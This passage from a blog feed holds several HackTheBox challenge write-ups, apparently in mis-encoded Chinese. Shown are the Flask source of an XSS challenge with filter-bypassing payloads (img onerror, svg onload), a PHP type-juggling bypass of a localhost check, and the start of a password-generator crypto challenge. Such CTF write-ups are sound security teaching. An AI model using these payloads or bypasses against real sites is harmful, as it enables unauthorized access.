class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_bot</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">    host, port = <span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span></span><br><span class="line">    HOST = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    options = Options()</span><br><span class="line"></span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-infobars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-background-networking&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-default-apps&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-sync&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-translate&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--hide-scrollbars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--metrics-recording-only&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--mute-audio&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-first-run&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--dns-prefetch-disable&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--safebrowsing-disable-auto-update&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--media-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disk-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--user-agent=HTB/1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    service = Service(executable_path=<span class="string">&quot;/usr/bin/chromedriver&quot;</span>)</span><br><span class="line">    browser = webdriver.Chrome(service=service, options=options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(<span class="string">f&quot;<span class="subst">&#123;HOST&#125;</span>/bot?token=<span class="subst">&#123;BOT_TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        WebDriverWait(browser, <span class="number">3</span>).until(EC.alert_is_present())</span><br><span class="line"></span><br><span class="line">        alert = browser.switch_to.alert</span><br><span class="line">        alert.accept()</span><br><span class="line">        send_flag(user_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        registered_emails.clear()</span><br><span class="line">        browser.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json <span class="keyword">or</span> <span class="keyword">not</span> request.json[<span class="string">&quot;email&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blacklist_pass(request.json[<span class="string">&quot;email&quot;</span>]):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">401</span>)</span><br><span class="line"></span><br><span class="line">    registered_emails.append(request.json[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    Thread(target=start_bot, args=(request.remote_addr,)).start()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>:<span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>) != BOT_TOKEN:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bot.html&quot;</span>, emails=registered_emails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;connect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_connect</span>():</span><br><span class="line">    socket_clients[request.sid] = request.remote_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;disconnect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_disconnect</span>():</span><br><span class="line">    <span class="keyword">del</span> socket_clients[request.sid]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘å¯ä»¥çœ‹åˆ°ä»–è®“æˆ‘å€‘è¨»å†Šä¿¡ç®±ï¼Œç„¶å¾Œæœƒæª¢æŸ¥ email æœ‰æ²’æœ‰åŒ…å« script é—œéµå­—ï¼Œå¦‚æœæˆ‘å€‘æˆåŠŸç¹é script è§¸ç™¼ alert å°±æœƒ sendFlagï¼Œæ‰€ä»¥ç›®æ¨™å°±æ˜¯ä¸å« script çš„ XSSã€‚<br>ä»¥ä¸‹æ”¾ä¸Šä¸€äº› payload ä¾›åƒè€ƒï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;invalid.jpg&quot;</span> onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/alert_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;æˆ‘å€‘ç›´æ¥ä¾†çœ‹ä¸»ç¨‹å¼ï¼š&lt;/p&gt;
&lt;div class=&quot;hig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="xss" scheme="https://kazma.tw/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Juggling facts Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/</id>
    <published>2024-11-01T17:50:29.643Z</published>
    <updated>2024-11-01T18:28:05.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é€™é¡Œæ˜¯ webï¼Œæˆ‘å€‘é€›ä¸€ä¸‹ç¶²ç«™å¾Œæœƒçœ‹åˆ°æ²’æœ‰æ˜é¡¯çš„è¼¸å…¥é»ï¼Œä½†æ˜¯æœ‰ä¸‰å€‹æŒ‰éˆ•æœƒå‘ˆç¾ä¸åŒçš„é é¢ï¼Œæˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ codeã€‚</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">spl_autoload_register</span>(function (<span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Controller$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;controllers/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Model$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;models/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;$&#123;name&#125;.php&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;M@k3l@R!d3s$&#x27;</span>, <span class="string">&#x27;web_juggling_facts&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span> = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;IndexController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;/api/getfacts&#x27;</span>, <span class="string">&#x27;IndexController@getfacts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$router</span>-&gt;<span class="keyword">match</span>());</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢å¯ä»¥çœ‹åˆ°ä»–è¨­å®šäº†å…©ç¨®è·¯ç”±ï¼Œä¸€ç¨®æ˜¯ GET &#x2F; æœƒå‘¼å« IndexController é¡ä¸­çš„ index æ–¹æ³•ï¼Œå¦ä¸€å€‹æ˜¯è¨»å†Šä¸€å€‹ POST æ–¹æ³•çš„è·¯ç”±ï¼ŒURL è·¯å¾‘ç‚º &#x2F;api&#x2F;getfactsï¼Œç•¶ç™¼é€ POST è«‹æ±‚è‡³ &#x2F;api&#x2F;getfacts è·¯å¾‘æ™‚ï¼Œæœƒå‘¼å« IndexController é¡ä¸­çš„ getfacts æ–¹æ³•ã€‚é‚£æˆ‘å€‘æ¥è‘—å°±çœ‹ <code>challenge/controllers/IndexController.php</code>ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">view</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfacts</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;type&#x27;</span>, <span class="variable">$jsondata</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>] === <span class="string">&#x27;secrets&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Currently this type can be only accessed through localhost!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;secrets&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;secrets&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;not_spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;not_spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid type!&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢æåˆ°åœ¨è¨ªå• &#x2F;api&#x2F;getfacts çš„æ™‚å€™æœƒå¸¶ä¸€å€‹ type çš„åƒæ•¸ï¼Œæ ¹æ“šä¸åŒçš„ case æœƒæœ‰ä¸åŒçš„ responseï¼Œå…¶ä¸­æœ‰ä¸€å€‹ type æ˜¯ secrets ä»–å‰é¢å…ˆæª¢æŸ¥æ˜¯å¦æ˜¯æœ¬åœ°å­˜å–ï¼Œå¦çš„è©±å°±æœƒ return ç„¶å¾Œè¼¸å‡ºè­¦å‘Šã€‚<br>é‚£é€™é‚Šå°±è¦æåˆ° php çš„ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ç•¶æˆ‘å€‘ä½¿ç”¨å…©å€‹ç­‰è™Ÿåšæ¯”è¼ƒçš„æ™‚å€™æœƒè¢«ç¨±ä½œ loose comparisonï¼Œå› ç‚ºç•¶å…©å€‹é¡å‹ä¸åŒæ™‚ php æœƒå˜—è©¦å¹«æˆ‘å€‘è½‰å‹å†åšæ¯”è¼ƒã€‚<br>ä¾‹å¦‚ï¼Œ0 &#x3D;&#x3D; â€˜0â€™ å’Œ 0 &#x3D;&#x3D; false éƒ½æœƒè¿”å› trueï¼Œå› ç‚ºåœ¨é¬†æ•£æ¯”è¼ƒä¸‹ PHP æœƒå°‡å­—ç¬¦ä¸²å’Œå¸ƒçˆ¾å€¼è½‰æ›æˆæ•¸å­—é€²è¡Œæ¯”è¼ƒã€‚<br>è€Œç•¶æˆ‘å€‘ä½¿ç”¨ &#x3D;&#x3D;&#x3D;ï¼šé€™æœƒæ˜¯ä¸€å€‹ strict comparisonï¼Œä¸æœƒé€²è¡Œé¡å‹è½‰æ›ã€‚<br>åš´æ ¼æ¯”è¼ƒè¦æ±‚å€¼å’Œé¡å‹éƒ½å¿…é ˆç›¸åŒï¼Œå¦å‰‡çµæœç‚º falseã€‚<br>ä¾‹å¦‚ï¼Œ0 &#x3D;&#x3D;&#x3D; â€˜0â€™ å’Œ 0 &#x3D;&#x3D;&#x3D; false éƒ½æœƒè¿”å› falseï¼Œå› ç‚ºé¡å‹ä¸åŒï¼ˆæ•¸å­—èˆ‡å­—ç¬¦ä¸²æˆ–å¸ƒçˆ¾å€¼ï¼‰ï¼ŒPHP ä¸æœƒå˜—è©¦è½‰æ›å®ƒå€‘ã€‚<br>é‚£é€™é‚Šæ”¾ä¸Šä¸€å¼µåœ–ç‰‡çµ¦å¤§å®¶åƒè€ƒï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*E-5cStZUndETrKec.png"                      alt="ref"                ><br>åœ–ç‰‡ä¾†æºï¼š<a class="link"   href="https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39" >https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>é‚£æˆ‘å€‘å°±å¯ä»¥å˜—è©¦æ‰¾åˆ°ä¸€å€‹å€¼æ˜¯æœƒåœ¨ä¸‰å€‹ç­‰è™Ÿæ™‚ä¸ç­‰æ–¼ â€˜secretsâ€™ ä½†æ˜¯å…©å€‹ç­‰è™Ÿæœƒç›¸ç­‰çš„ï¼Œé€™ç¨®æ¼æ´ä¹Ÿå«åš Type Juggling Vulnerability è·Ÿé¡Œç›®å‘¼æ‡‰ï¼Œä¸­æ–‡å¯èƒ½å«å‹åˆ¥å¼·åˆ¶æ¼æ´ã€‚<br>é‚£æˆ‘å€‘å°±é€é true ä¾†è·Ÿ â€œsecretsâ€ åšæ¯”è¼ƒæ­é… burp ä¾†å”åŠ©æˆ‘å€‘é€å°åŒ…ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling.png"                      alt="weak"                ></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts" >https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;é€™é¡Œæ˜¯ webï¼Œæˆ‘å€‘é€›ä¸€ä¸‹ç¶²ç«™å¾Œæœƒçœ‹åˆ°æ²’æœ‰æ˜é¡¯çš„è¼¸å…¥é»ï¼Œä½†æ˜¯</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="php" scheme="https://kazma.tw/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SPG Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/</id>
    <published>2024-11-01T10:03:28.954Z</published>
    <updated>2024-11-01T12:09:01.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é¦–å…ˆé¡Œç›®é™„çµ¦æˆ‘å€‘ <code>source.py</code> ä»¥åŠ <code>output.txt</code>ï¼Œå…¶ä¸­ç¨‹å¼çš„ä¸»é‚è¼¯å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, MASTER_KEY</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password</span>():</span><br><span class="line">    master_key = <span class="built_in">int</span>.from_bytes(MASTER_KEY, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> master_key:</span><br><span class="line">        bit = master_key &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bit:</span><br><span class="line">            password += random.choice(ALPHABET[: <span class="built_in">len</span>(ALPHABET) // <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password += random.choice(ALPHABET[<span class="built_in">len</span>(ALPHABET) // <span class="number">2</span> :])</span><br><span class="line">        master_key &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    password = generate_password()</span><br><span class="line">    encryption_key = sha256(MASTER_KEY).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">f&quot;Your Password : <span class="subst">&#123;password&#125;</span>\nEncrypted Flag : <span class="subst">&#123;b64encode(ciphertext).decode()&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘ä¾†åˆ†æä¸€ä¸‹ä¸Šé¢åšäº†äº›ä»€éº¼ï¼Œé¦–å…ˆä»–æœ‰ä¸€å€‹ <code>generate_password()</code> çš„å‡½å¼æŠŠå¼•å…¥çš„ MASTER_KEY ä¾†ç”Ÿæˆä¸€çµ„å¯†ç¢¼ã€‚ä»–å…ˆæŠŠ MASTER_KEY ç”¨ little_endian çš„æ ¼å¼è½‰æˆæ•´æ•¸ï¼Œæ¥è‘—å¾æœ€ä½ä½é–‹å§‹è‹¥ bit ç‚º 1 å‰‡å¾è‡ªå®šç¾©çš„å­—æ¯è¡¨å‰åŠéƒ¨åˆ†æŒ‘ä¸€å€‹å­—ç¬¦åŠ å…¥ passwordï¼Œåä¹‹ï¼Œè‹¥ bit ç‚º 0 å°±å¾å¾ŒåŠéƒ¨æŒ‘ä¸€å€‹å­—ç¬¦ï¼Œç„¶å¾Œå¾€é«˜ä½ç§»å‹•ä¸€å€‹é‡è¤‡å‰é¢çš„æ“ä½œã€‚å†ä¾† main ä½¿ç”¨ MASTER_KEY é€šé SHA-256 é›œæ¹Šç®—æ³•ç”ŸæˆåŠ å¯†é‡‘é‘° encryption_keyï¼Œ<code>sha256(MASTER_KEY).digest()</code> 